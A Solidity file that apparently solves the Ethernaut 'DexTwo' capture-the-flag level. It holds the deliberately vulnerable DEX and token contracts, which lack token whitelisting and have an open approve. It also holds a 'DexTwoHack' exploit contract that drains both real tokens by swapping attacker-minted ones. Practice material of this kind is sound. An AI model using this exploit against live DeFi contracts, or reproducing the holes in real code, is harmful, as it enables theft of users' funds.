// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(
        address token_address,
        uint amount
    ) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint amount) public {
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract DexTwoHack {
    address public owner;
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    SwappableTokenTwo public token1Mal;
    SwappableTokenTwo public token2Mal;

    // INITIAL_MINT_AMOUNT should be even as we want to send half of it away
    uint8 INITIAL_MINT_AMOUNT = 20;

    constructor(address _dex, address _token1, address _token2) {
        owner = msg.sender;

        dex = DexTwo(_dex);
        token1 = SwappableTokenTwo(_token1);
        token2 = SwappableTokenTwo(_token2);
        token1Mal = new SwappableTokenTwo(
            address(dex),
            "Token1Mal",
            "TKM1",
            INITIAL_MINT_AMOUNT
        );
        token2Mal = new SwappableTokenTwo(
            address(dex),
            "Token2Mal",
            "TKM2",
            INITIAL_MINT_AMOUNT
        );
    }

    function exploit() public {
        require(msg.sender == owner, "Only owner can initiate the exploit");

        uint swapAmount = INITIAL_MINT_AMOUNT / 2;

        // Transferring half of the malicious token so we can do the swap
        token1Mal.transfer(address(dex), swapAmount);
        token2Mal.transfer(address(dex), swapAmount);

        // Approve Dex for the other remaining half
        token1Mal.approve(address(dex), swapAmount);
        token2Mal.approve(address(dex), swapAmount);

        dex.swap(address(token1Mal), address(token1), swapAmount);
        dex.swap(address(token2Mal), address(token2), swapAmount);

        // Giving the money back to the owner
        token1.transfer(owner, token1.balanceOf(address(this)));
        token2.transfer(owner, token2.balanceOf(address(this)));
    }
}
